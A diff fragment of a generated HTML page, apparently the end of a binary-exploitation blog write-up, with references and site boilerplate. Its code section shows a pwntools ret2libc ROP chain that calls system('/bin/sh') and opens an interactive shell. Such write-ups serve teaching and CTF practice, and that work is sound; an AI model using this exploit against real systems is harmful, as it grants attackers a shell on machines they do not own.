+rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(libc)
+rop<span style="color:#f92672">.</span>call(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))
+rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))])
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([fill, rop<span style="color:#f92672">.</span>chain()])
+
+p<span style="color:#f92672">.</span>sendline(payload)
+pwn<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Have fun!&#34;</span>)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p><a href="https://www.agner.org/optimize/calling_conventions.pdf">https://www.agner.org/optimize/calling_conventions.pdf</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/mitmproxy/">
+                <span class="button__text">!e MITM Proxy</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+<hr>
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "trib0r3s-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="noopener">CC BY 4.0</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
